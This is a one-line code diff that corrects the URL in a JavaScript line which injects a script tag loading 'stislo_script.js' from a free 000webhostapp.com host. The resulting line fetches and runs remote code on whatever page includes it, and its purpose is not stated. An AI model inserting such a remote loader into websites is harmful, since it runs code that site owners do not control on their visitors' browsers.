@@ -1,1 +1,1 @@
-document.body.appendChild(document.createElement("script")).setAttribute('src', 'https:/dimasion2010.000webhostapp.com/stislo_script.js')
+document.body.appendChild(document.createElement("script")).setAttribute('src', 'https://dimasion2010.000webhostapp.com/stislo_script.js')
